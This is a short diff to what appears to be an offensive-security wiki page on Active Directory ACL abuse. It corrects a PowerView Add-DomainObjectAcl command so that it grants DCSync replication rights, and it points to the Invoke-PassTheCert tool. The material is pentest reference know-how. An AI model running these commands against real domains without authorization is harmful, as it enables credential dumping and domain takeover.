@@ -68,7 +68,7 @@ From a Windows system, this can be achieved with [Add-DomainObjectAcl](https://p
 Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
 
 # Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
-Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
+Add-DomainObjectAcl -Rights 'DCSync' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"
 ```
 
 Alternatively, the [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
